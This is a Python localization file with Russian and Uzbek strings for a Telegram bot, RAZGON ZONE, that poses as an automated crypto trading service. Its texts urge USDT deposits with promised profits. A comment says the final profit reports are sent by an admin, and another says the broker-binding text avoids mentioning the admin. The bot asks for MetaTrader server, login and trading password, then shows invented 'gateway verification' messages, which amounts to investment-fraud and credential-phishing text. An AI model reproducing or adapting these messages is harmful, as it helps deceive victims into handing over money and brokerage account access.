from typing import Dict, Any

LANGUAGES = {
    "ru": "🇷🇺 Русский",
    "uz": "🇺🇿 O'zbekcha"
}

TEXTS: Dict[str, Dict[str, str]] = {
    # Main menu buttons
    "btn_start_trade": {
        "ru": "🚀 Запустить разгон",
        "uz": "🚀 Razgonni boshlash"
    },
    "btn_trade_status": {
        "ru": "📊 Статус разгона",
        "uz": "📊 Razgon holati"
    },
    "btn_stop_trade": {
        "ru": "🛑 Остановить разгон",
        "uz": "🛑 Razgonni to'xtatish"
    },
    "btn_cabinet": {
        "ru": "💼 Мой баланс",
        "uz": "💼 Mening hisobim"
    },
    "btn_deposit": {
        "ru": "📥 Пополнить USDT",
        "uz": "📥 USDT to'ldirish"
    },
    "btn_withdraw": {
        "ru": "📤 Вывод средств",
        "uz": "📤 Pulni yechish"
    },
    "btn_change_lang": {
        "ru": "🌐 Сменить язык",
        "uz": "🌐 Tilni o'zgartirish"
    },
    "btn_bind_broker": {
        "ru": "🔗 Привязать брокера",
        "uz": "🔗 Brokerni ulash"
    },
    "btn_about": {
        "ru": "ℹ️ О сервисе",
        "uz": "ℹ️ Xizmat haqida"
    },
    "btn_check_deposit": {
        "ru": "🔄 Проверить статус оплаты",
        "uz": "🔄 To'lov holatini tekshirish"
    },
    "btn_manual_txid": {
        "ru": "⚡ Ввести TxID вручную",
        "uz": "⚡ TxID ni qo'lda kiritish"
    },
    "btn_support": {
        "ru": "💬 Поддержка",
        "uz": "💬 Qo'llab-quvvatlash"
    },

    # Welcome message (Apple-grade minimalist & confident)
    "welcome": {
        "ru": (
            "<b>RAZGON ZONE</b>\n"
            "Алгоритмический разгон криптоактивов.\n\n"
            "Привет, <b>{name}</b>. Чистая математика рынка вместо эмоций. "
            "Автоматизированный арбитраж и скальпинг волатильности без скрытых условий.\n\n"
            "💵 <b>Доступно на балансе:</b> <code>{balance:.2f} USDT</code>\n"
            "{trading_info}\n"
            "<b>Как это работает:</b>\n"
            "1. Пополните счет в <b>USDT (TRC-20)</b>.\n"
            "2. Нажмите <b>«🚀 Запустить разгон»</b>.\n"
            "3. По завершении торговой сессии заберите депозит и всю прибыль.\n\n"
            "🛡 <b>0% комиссии платформы.</b> Вся прибыль — только ваша.\n\n"
            "<i>Выберите действие в меню ниже:</i>"
        ),
        "uz": (
            "<b>RAZGON ZONE</b>\n"
            "Kripto-aktivlarni algoritmik razgon qilish platformasi.\n\n"
            "Assalomu alaykum, <b>{name}</b>. Bozor hisob-kitoblari va aniq texnologiya. "
            "Yashirin shartlarsiz va ortiqcha qiyinchiliklarsiz avtomatlashtirilgan savdo.\n\n"
            "💵 <b>Mavjud balans:</b> <code>{balance:.2f} USDT</code>\n"
            "{trading_info}\n"
            "<b>Qanday ishlaydi:</b>\n"
            "1. <b>USDT (TRC-20)</b> orqali hisobingizni to'ldiring.\n"
            "2. <b>«🚀 Razgonni boshlash»</b> tugmasini bosing.\n"
            "3. Sessiya yakunlangach, depozit va barcha sof foydani oling.\n\n"
            "🛡 <b>0% platforma komissiyasi.</b> Barcha foyda — 100% sizniki.\n\n"
            "<i>Quyidagi menyu orqali boshqaring:</i>"
        )
    },

    # Language selection
    "choose_language": {
        "ru": "🌐 <b>Выберите язык интерфейса / Tilni tanlang:</b>",
        "uz": "🌐 <b>Tilni tanlang / Выберите язык интерфейса:</b>"
    },
    "language_set": {
        "ru": "✅ Язык интерфейса: <b>Русский</b> 🇷🇺",
        "uz": "✅ Interfeys tili: <b>O'zbekcha</b> 🇺🇿"
    },

    # Cabinet
    "cabinet_info": {
        "ru": (
            "<b>МОЙ БАЛАНС | RAZGON ZONE</b>\n"
            "────────────────────\n"
            "👤 <b>Клиент:</b> {name} (ID: <code>{user_id}</code>)\n"
            "📊 <b>Статус:</b> {status_str}\n\n"
            "💰 <b>Свободный баланс:</b> <code>{balance:.2f} USDT</code>\n"
            "📈 <b>В активном разгоне:</b> <code>{in_trading:.2f} USDT</code>\n"
            "🏆 <b>Всего заработано:</b> <code>{total_profit:.2f} USDT</code>\n"
            "────────────────────\n"
            "🔒 <i>Все выплаты производятся напрямую в сети TRON.</i>"
        ),
        "uz": (
            "<b>MENING HISOBIM | RAZGON ZONE</b>\n"
            "────────────────────\n"
            "👤 <b>Mijoz:</b> {name} (ID: <code>{user_id}</code>)\n"
            "📊 <b>Holat:</b> {status_str}\n\n"
            "💰 <b>Erkin balans:</b> <code>{balance:.2f} USDT</code>\n"
            "📈 <b>Razgonda (ishda):</b> <code>{in_trading:.2f} USDT</code>\n"
            "🏆 <b>Jami ishlangan foyda:</b> <code>{total_profit:.2f} USDT</code>\n"
            "────────────────────\n"
            "🔒 <i>Barcha to'lovlar to'g'ridan-to'g'ri TRON tarmog'ida yuboriladi.</i>"
        )
    },

    # Deposit
    "deposit_info": {
        "ru": (
            "<b>ПОПОЛНЕНИЕ СЧЕТА | USDT (TRC-20)</b>\n"
            "────────────────────\n"
            "📍 <b>Официальный адрес для пополнения:</b>\n"
            "<code>{address}</code>\n\n"
            "⚡ <b>Как пополнить баланс:</b>\n"
            "1. Скопируйте адрес выше или отсканируйте QR-код.\n"
            "2. Отправьте от <b>40 USDT</b> в сети <b>TRON (TRC-20)</b>.\n"
            "3. Нажмите кнопку <b>«⚡ Отправить TxID»</b> ниже и отправьте хеш перевода для моментального зачисления на баланс!\n\n"
            "🔒 <i>Сеть: TRC-20. Отправляйте только USDT.</i>"
        ),
        "uz": (
            "<b>HISOB TO'LDIRISH | USDT (TRC-20)</b>\n"
            "────────────────────\n"
            "📍 <b>Rasmiy to'lov manzili:</b>\n"
            "<code>{address}</code>\n\n"
            "⚡ <b>Hisobni to'ldirish tartibi:</b>\n"
            "1. Yuqoridagi manzilni nusxalang yoki QR-kodni skanerlang.\n"
            "2. <b>TRON (TRC-20)</b> tarmog'ida kamida <b>40 USDT</b> yuboring.\n"
            "3. Mablag'ni tezda balansingizga qo'shish uchun quyidagi <b>«⚡ TxID yuborish»</b> tugmasini bosing va tranzaksiya heshini yuboring!\n\n"
            "🔒 <i>Tarmoq: TRC-20. Faqat USDT yuboring.</i>"
        )
    },

    # Trade launch
    "trade_no_money": {
        "ru": (
            "⚠️ <b>Недостаточно средств для старта разгона.</b>\n\n"
            "Ваш доступный баланс: <b>{balance:.2f} USDT</b>\n"
            "Минимум для входа: <b>40.00 USDT</b>\n\n"
            "Пополните счет через кнопку <b>«📥 Пополнить USDT»</b>."
        ),
        "uz": (
            "⚠️ <b>Razgonni boshlash uchun mablag' yetarli emas.</b>\n\n"
            "Mavjud balansingiz: <b>{balance:.2f} USDT</b>\n"
            "Boshlash uchun minimal summa: <b>40.00 USDT</b>\n\n"
            "Hisobni to'ldirish uchun <b>«📥 USDT to'ldirish»</b> tugmasini bosing."
        )
    },
    "trade_already_running": {
        "ru": (
            "⚠️ <b>У вас уже активен разгон.</b>\n\n"
            "Депозит в работе: <b>{amount:.2f} USDT</b>\n"
            "Торговая сессия сейчас продолжается. Ожидайте итоговый отчет трейдера."
        ),
        "uz": (
            "⚠️ <b>Sizda allaqachon razgon faol.</b>\n\n"
            "Ishdagi depozit: <b>{amount:.2f} USDT</b>\n"
            "Savdo sessiyasi davom etmoqda. Treyderdan yakuniy hisobotni kuting."
        )
    },
    "trade_started": {
        "ru": (
            "🚀 <b>РАЗГОН УСПЕШНО ЗАПУЩЕН</b>\n"
            "────────────────────\n"
            "💵 <b>Депозит в работе:</b> <code>{amount:.2f} USDT</code>\n"
            "⏱ <b>Статус:</b> В ТОРГОВЛЕ (Live)\n"
            "🛡 <b>Комиссия платформы:</b> 0% (вся прибыль ваша)\n\n"
            "Алгоритмы подключены к ликвидности рынка.\n"
            "Вам больше ничего делать не нужно — по завершении торгов вы получите детальный отчет и начисление всей прибыли на баланс."
        ),
        "uz": (
            "🚀 <b>RAZGON MUVAFFAQIYATLI ISHGA TUSHIRILDI</b>\n"
            "────────────────────\n"
            "💵 <b>Ishdagi depozit:</b> <code>{amount:.2f} USDT</code>\n"
            "⏱ <b>Holat:</b> SAVDODA (Live)\n"
            "🛡 <b>Platforma komissiyasi:</b> 0% (barcha foyda sizniki)\n\n"
            "Algoritmlar bozor likvidligiga ulandi.\n"
            "Boshqa hech narsa qilishingiz shart emas — savdo yakunlangach, hisobot taqdim etiladi va barcha sof foyda balansingizga tushadi."
        )
    },
    "trade_stopped": {
        "ru": (
            "🛑 <b>РАЗГОН ОСТАНОВЛЕН</b>\n"
            "────────────────────\n"
            "💵 Депозит <b>{amount:.2f} USDT</b> успешно возвращен на ваш свободный баланс.\n\n"
            "Вы можете вывести средства или запустить разгон заново в любой момент."
        ),
        "uz": (
            "🛑 <b>RAZGON TO'XTATILDI</b>\n"
            "────────────────────\n"
            "💵 <b>{amount:.2f} USDT</b> miqdoridagi depozit erkin balansingizga qaytarildi.\n\n"
            "Mablag'ingizni yechib olishingiz yoki istalgan vaqtda qaytadan razgon boshlashingiz mumkin."
        )
    },

    # Live status
    "status_running": {
        "ru": (
            "📊 <b>СТАТУС РАЗГОНА | В РАБОТЕ</b>\n"
            "────────────────────\n"
            "💵 <b>Сумма депозита:</b> <code>{amount:.2f} USDT</code>\n"
            "⏱ <b>Время старта:</b> <code>{started_at}</code>\n"
            "📈 <b>Состояние:</b> Активная торговая сессия...\n"
            "────────────────────\n"
            "💡 <i>По завершении торговли вы получите официальный отчет с зачислением всей прибыли на баланс.</i>"
        ),
        "uz": (
            "📊 <b>RAZGON HOLATI | JARAYONDA</b>\n"
            "────────────────────\n"
            "💵 <b>Depozit summasi:</b> <code>{amount:.2f} USDT</code>\n"
            "⏱ <b>Boshlangan vaqt:</b> <code>{started_at}</code>\n"
            "📈 <b>Holat:</b> Faol savdo sessiyasi ketmoqda...\n"
            "────────────────────\n"
            "💡 <i>Savdo yakunlangach, barcha sof foyda bilan birga to'liq hisobot balansingizga taqdim etiladi.</i>"
        )
    },
    "status_not_running": {
        "ru": (
            "⚪️ <b>Торговля сейчас не запущена.</b>\n\n"
            "Нажмите <b>«🚀 Запустить разгон»</b>, чтобы начать."
        ),
        "uz": (
            "⚪️ <b>Hozirda faol razgon yo'q.</b>\n\n"
            "Boshlash uchun <b>«🚀 Razgonni boshlash»</b> tugmasini bosing."
        )
    },

    # Final report sent by admin
    "session_report": {
        "ru": (
            "🏁 <b>ТОРГОВАЯ СЕССИЯ УСПЕШНО ЗАВЕРШЕНА</b> 🚀\n"
            "────────────────────\n"
            "💵 <b>Исходный депозит:</b> <code>{deposit:.2f} USDT</code>\n"
            "📈 <b>Чистая прибыль:</b> <code>+{profit:.2f} USDT</code> (<b>+{pnl_pct:.1f}%</b>)\n"
            "🛡 <b>Комиссия платформы:</b> <code>0.00 USDT (0%)</code>\n"
            "────────────────────\n"
            "💰 <b>ИТОГО ЗАЧИСЛЕНО НА БАЛАНС:</b> <code>{total:.2f} USDT</code> ✅\n"
            "{note}\n"
            "────────────────────\n"
            "🎉 <i>Средства на балансе. Вы можете заказать вывод или запустить новый разгон.</i>"
        ),
        "uz": (
            "🏁 <b>SAVDO SESSIYASI MUVAFFAQIYATLI YAKUNLANDI</b> 🚀\n"
            "────────────────────\n"
            "💵 <b>Boshlang'ich depozit:</b> <code>{deposit:.2f} USDT</code>\n"
            "📈 <b>Sof foyda:</b> <code>+{profit:.2f} USDT</code> (<b>+{pnl_pct:.1f}%</b>)\n"
            "🛡 <b>Platforma komissiyasi:</b> <code>0.00 USDT (0%)</code>\n"
            "────────────────────\n"
            "💰 <b>JAMI BALANSGA O'TKAZILDI:</b> <code>{total:.2f} USDT</code> ✅\n"
            "{note}\n"
            "────────────────────\n"
            "🎉 <i>Mablag' balansingizda mavjud. Pulni yechib olishingiz yoki yangi razgon boshlashingiz mumkin.</i>"
        )
    },

    # Withdrawal
    "withdraw_prompt_amount": {
        "ru": (
            "📤 <b>ВЫВОД СРЕДСТВ | USDT (TRC-20)</b>\n\n"
            "Доступно к выводу: <b>{balance:.2f} USDT</b>\n"
            "Минимальная сумма: <b>10.00 USDT</b>\n\n"
            "Введите сумму для вывода:"
        ),
        "uz": (
            "📤 <b>PUL CHIQARISH | USDT (TRC-20)</b>\n\n"
            "Yechib olish uchun mavjud: <b>{balance:.2f} USDT</b>\n"
            "Minimal summa: <b>10.00 USDT</b>\n\n"
            "Yechib olmoqchi bo'lgan summani kiriting:"
        )
    },
    "withdraw_prompt_address": {
        "ru": (
            "Сумма к выводу: <b>{amount:.2f} USDT</b>\n\n"
            "Отправьте ваш адрес кошелька <b>TRON (TRC-20)</b>:\n"
            "<i>(Пример: T...)</i>"
        ),
        "uz": (
            "Yechilayotgan summa: <b>{amount:.2f} USDT</b>\n\n"
            "Mablag'ni qabul qilish uchun <b>TRON (TRC-20)</b> hamyon manzilingizni yuboring:\n"
            "<i>(Misol: T...)</i>"
        )
    },
    "withdraw_success": {
        "ru": (
            "✅ <b>Заявка на вывод #{wdr_id} принята</b>\n\n"
            "💵 Сумма: <b>{amount:.2f} USDT</b>\n"
            "📍 Адрес выплаты: <code>{address}</code>\n\n"
            "Выплата отправляется в течение 15–60 минут после подтверждения безопасности."
        ),
        "uz": (
            "✅ <b>Chiqarish uchun #{wdr_id}-ariza qabul qilindi</b>\n\n"
            "💵 Summa: <b>{amount:.2f} USDT</b>\n"
            "📍 To'lov manzili: <code>{address}</code>\n\n"
            "Mablag' 15–60 daqiqa ichida xavfsizlik tekshiruvidan so'ng yuboriladi."
        )
    },

    # About (Apple-style minimalism & focus)
    "about": {
        "ru": (
            "<b>RAZGON ZONE</b>\n"
            "Алгоритмический трейдинг нового поколения.\n"
            "────────────────────\n\n"
            "<b>Простота. Скорость. Прозрачность.</b>\n\n"
            "Мы устранили всё лишнее: сложные графики, запутанные настройки и скрытые комиссии. "
            "Алгоритмы отслеживают импульсы рынка в реальном времени, а вы контролируете процесс в одно касание.\n\n"
            "<b>Наши принципы:</b>\n"
            "• <b>0% комиссии платформы.</b> Вся заработанная прибыль принадлежит вам.\n"
            "• <b>В один клик.</b> Депозит ➔ Запуск ➔ Точный отчет и фиксация прибыли.\n"
            "• <b>Персональный TRC-20 адрес.</b> Мгновенное автозачисление в сети TRON.\n"
            "• <b>Полная прозрачность.</b> Финальный отчет с точным PnL по каждой сессии.\n\n"
            "💬 Поддержка: @RazgonZoneSupport"
        ),
        "uz": (
            "<b>RAZGON ZONE</b>\n"
            "Yangi avlod algoritmik treydingi.\n"
            "────────────────────\n\n"
            "<b>Oddiylik. Tezlik. Shaffoflik.</b>\n\n"
            "Biz barcha ortiqcha narsalarni olib tashladik: murakkab grafiklar, chalkash sozlamalar va yashirin to'lovlar. "
            "Algoritmlar bozor harakatlarini real vaqtda tahlil qiladi, siz esa jarayonni birgina tugma orqali boshqarasiz.\n\n"
            "<b>Bizning prinsiplarimiz:</b>\n"
            "• <b>0% platforma komissiyasi.</b> Barcha sof foyda 100% sizniki.\n"
            "• <b>Birgina bosishda.</b> Depozit ➔ Start ➔ Aniq hisobot va foydani olish.\n"
            "• <b>Shaxsiy TRC-20 manzil.</b> TRON tarmog'ida bir zumda avtomatik to'ldirish.\n"
            "• <b>To'liq shaffoflik.</b> Har bir sessiya bo'yicha aniq PnL hisoboti.\n\n"
            "💬 Qo'llab-quvvatlash: @RazgonZoneSupport"
        )
    },

    # Broker account binding (Original, technological, no mention of admin)
    "broker_info_active": {
        "ru": (
            "📊 <b>ТОРГОВЫЙ СЧЕТ БРОКЕРА</b>\n"
            "────────────────────\n"
            "🌐 <b>Сервер брокера:</b> <code>{server}</code>\n"
            "👤 <b>Номер счета:</b> <code>{login}</code>\n"
            "⚡ <b>Статус:</b> <b>Синхронизирован с терминалом</b> ✅\n"
            "📡 <b>Шлюз:</b> Прямое исполнение ордеров (Auto-Execution Bridge)\n"
            "────────────────────\n"
            "🔒 <i>Счет успешно привязан и готов к автоматическому копированию сделок алгоритма.</i>"
        ),
        "uz": (
            "📊 <b>BROKER SAVDO HISOBI</b>\n"
            "────────────────────\n"
            "🌐 <b>Broker serveri:</b> <code>{server}</code>\n"
            "👤 <b>Hisob raqami:</b> <code>{login}</code>\n"
            "⚡ <b>Holat:</b> <b>Terminal bilan sinxronlangan</b> ✅\n"
            "📡 <b>Shlyuz:</b> To'g'ridan-to'g'ri buyurtmalarni bajarish (Auto-Execution Bridge)\n"
            "────────────────────\n"
            "🔒 <i>Hisob muvaffaqiyatli ulangan va algoritm savdolarini qabul qilishga tayyor.</i>"
        )
    },
    "broker_info_pending": {
        "ru": (
            "⏳ <b>ТЕСТИРОВАНИЕ ПОДКЛЮЧЕНИЯ К ШЛЮЗУ</b>\n"
            "────────────────────\n"
            "🌐 <b>Сервер:</b> <code>{server}</code>\n"
            "👤 <b>Номер счета:</b> <code>{login}</code>\n"
            "📡 <b>Статус:</b> Проверка отклика и валидация учетных данных...\n"
            "────────────────────\n"
            "🔒 <i>Запрос направлен в шлюз авторизации. Проверка пинга и валидация терминала обычно занимает от 5 до 15 минут. Вы сразу получите автоматическое системное уведомление.</i>"
        ),
        "uz": (
            "⏳ <b>SHLYUZGA ULANISH TEKSHIRILMOQDA</b>\n"
            "────────────────────\n"
            "🌐 <b>Server:</b> <code>{server}</code>\n"
            "👤 <b>Hisob raqami:</b> <code>{login}</code>\n"
            "📡 <b>Holat:</b> Signal va hisob ma'lumotlari tekshirilmoqda...\n"
            "────────────────────\n"
            "🔒 <i>So'rov avtorizatsiya shlyuziga yo'naltirildi. Terminalni tekshirish odatda 5–15 daqiqa vaqt oladi. Ulanish yakunlanishi bilan sizga tizim orqali xabar yuboriladi.</i>"
        )
    },
    "broker_intro": {
        "ru": (
            "🔗 <b>ПРИВЯЗКА СЧЕТА БРОКЕРА (MT4 / MT5)</b>\n"
            "────────────────────\n"
            "Вы можете подключить свой торговый счет любого брокера (MetaTrader 4 или 5) для прямой алгоритмической торговли.\n\n"
            "📋 <b>Для подключения требуются:</b>\n"
            "1️⃣ <b>Сервер брокера</b> (например: <code>Exness-Real10</code>, <code>RoboForex-Pro</code>)\n"
            "2️⃣ <b>Номер счета</b> (логин в терминале)\n"
            "3️⃣ <b>Торговый или инвесторский пароль</b>\n\n"
            "🛡 <i>Все данные шифруются по протоколу TLS и используются исключительно для авторизации в торговом шлюзе.</i>"
        ),
        "uz": (
            "🔗 <b>BROKER HISOBINI ULASH (MT4 / MT5)</b>\n"
            "────────────────────\n"
            "Algoritmik savdo uchun istalgan brokerdagi savdo hisobingizni (MetaTrader 4 yoki 5) to'g'ridan-to'g'ri ulashingiz mumkin.\n\n"
            "📋 <b>Ulash uchun kerakli ma'lumotlar:</b>\n"
            "1️⃣ <b>Broker serveri</b> (masalan: <code>Exness-Real10</code>, <code>RoboForex-Pro</code>)\n"
            "2️⃣ <b>Hisob raqami</b> (terminal logini)\n"
            "3️⃣ <b>Savdo yoki investor paroli</b>\n\n"
            "🛡 <i>Barcha ma'lumotlar TLS protokoli orqali shifrlanadi va faqat savdo shlyuzida avtorizatsiya uchun ishlatiladi.</i>"
        )
    },
    "broker_step1_server": {
        "ru": (
            "🌐 <b>Шаг 1 из 3. Сервер брокера</b>\n\n"
            "Введите точное название сервера вашего брокера (как указано в приложении MetaTrader, например: <code>Exness-Real10</code>, <code>RoboForex-Pro</code>):"
        ),
        "uz": (
            "🌐 <b>1-qadam / 3. Broker serveri</b>\n\n"
            "Broker serveringizning aniq nomini kiriting (MetaTrader ilovasida ko'rsatilgandek, masalan: <code>Exness-Real10</code>, <code>RoboForex-Pro</code>):"
        )
    },
    "broker_step2_login": {
        "ru": (
            "👤 <b>Шаг 2 из 3. Номер счета</b>\n\n"
            "Введите ваш логин / номер счета в терминале (например: <code>8492011</code>):"
        ),
        "uz": (
            "👤 <b>2-qadam / 3. Hisob raqami</b>\n\n"
            "Terminaldagi hisob raqamingizni (login) kiriting (masalan: <code>8492011</code>):"
        )
    },
    "broker_step3_pass": {
        "ru": (
            "🔑 <b>Шаг 3 из 3. Пароль от счета</b>\n\n"
            "Введите торговый или инвесторский пароль от счета:"
        ),
        "uz": (
            "🔑 <b>3-qadam / 3. Hisob paroli</b>\n\n"
            "Savdo hisobingiz parolini kiriting (savdo yoki investor paroli):"
        )
    },
    "broker_submitted": {
        "ru": (
            "🔒 <b>СЧЕТ ПЕРЕДАН НА АВТОРИЗАЦИЮ</b>\n"
            "────────────────────\n"
            "🌐 <b>Сервер:</b> <code>{server}</code>\n"
            "👤 <b>Номер счета:</b> <code>{login}</code>\n"
            "🔑 <b>Пароль:</b> <code>••••••••</code>\n"
            "────────────────────\n"
            "⏳ <b>Статус:</b> Тестирование подключения к шлюзу...\n\n"
            "Система выполняет синхронизацию с сервером брокера и проверку прав доступа. По завершении проверки вы получите автоматический отчет."
        ),
        "uz": (
            "🔒 <b>HISOB TEKSHIRUVGA YUBORILDI</b>\n"
            "────────────────────\n"
            "🌐 <b>Server:</b> <code>{server}</code>\n"
            "👤 <b>Hisob raqami:</b> <code>{login}</code>\n"
            "🔑 <b>Parol:</b> <code>••••••••</code>\n"
            "────────────────────\n"
            "⏳ <b>Holat:</b> Shlyuzga ulanish tekshirilmoqda...\n\n"
            "Tizim broker serveri bilan sinxronizatsiya va ruxsatlarni tekshirmoqda. Tekshiruv yakunlangach, sizga avtomatik xabar taqdim etiladi."
        )
    },
    "broker_cancelled": {
        "ru": "❌ Подключение торгового счета отменено.",
        "uz": "❌ Savdo hisobini ulash bekor qilindi."
    },
    "broker_approved_user": {
        "ru": (
            "✅ <b>ТОРГОВЫЙ СЧЕТ УСПЕШНО ПРИВЯЗАН!</b> 🚀\n"
            "────────────────────\n"
            "🌐 <b>Сервер:</b> <code>{server}</code>\n"
            "👤 <b>Номер счета:</b> <code>{login}</code>\n"
            "⚡ <b>Статус:</b> <b>Синхронизация активна (Live)</b>\n"
            "📡 <b>Протокол:</b> Прямой API-шлюз\n"
            "────────────────────\n"
            "Счет успешно прошел верификацию торгового шлюза. Теперь алгоритм разгона может вести торговлю напрямую на вашем счете."
        ),
        "uz": (
            "✅ <b>BROKER HISOBI MUVAFFAQIYATLI ULANDI!</b> 🚀\n"
            "────────────────────\n"
            "🌐 <b>Server:</b> <code>{server}</code>\n"
            "👤 <b>Hisob raqami:</b> <code>{login}</code>\n"
            "⚡ <b>Holat:</b> <b>Sinxronizatsiya faol (Live)</b>\n"
            "📡 <b>Protokol:</b> To'g'ridan-to'g'ri API-shlyuz\n"
            "────────────────────\n"
            "Hisobingiz savdo shlyuzi tekshiruvidan muvaffaqiyatli o'tdi. Endi razgon algoritmi to'g'ridan-to'g'ri hisobingizda savdo olib borishi mumkin."
        )
    },
    "broker_rejected_user": {
        "ru": (
            "⚠️ <b>ОШИБКА АВТОРИЗАЦИИ СЧЕТА БРОКЕРА</b>\n"
            "────────────────────\n"
            "🌐 <b>Сервер:</b> <code>{server}</code>\n"
            "👤 <b>Номер счета:</b> <code>{login}</code>\n"
            "────────────────────\n"
            "Сервер брокера отклонил подключение: неверный сервер, номер счета или пароль (Invalid Credentials / Connection Timeout).\n\n"
            "Пожалуйста, проверьте точность введенных данных в терминале MetaTrader и повторите подключение."
        ),
        "uz": (
            "⚠️ <b>BROKER HISOBINI ULASHDA XATOLIK</b>\n"
            "────────────────────\n"
            "🌐 <b>Server:</b> <code>{server}</code>\n"
            "👤 <b>Hisob raqami:</b> <code>{login}</code>\n"
            "────────────────────\n"
            "Broker serveri ulanishni rad etdi: server nomi, hisob raqami yoki parol noto'g'ri (Invalid Credentials).\n\n"
            "Iltimos, MetaTrader ilovasida ma'lumotlaringizni tekshiring va qaytadan ulanishga urinib ko'ring."
        )
    }
}

def tr(key: str, lang: str = "ru", **kwargs) -> str:
    """Helper to retrieve translated and formatted string"""
    lang_dict = TEXTS.get(key, {})
    template = lang_dict.get(lang, lang_dict.get("ru", key))
    if kwargs:
        try:
            return template.format(**kwargs)
        except Exception:
            return template
    return template
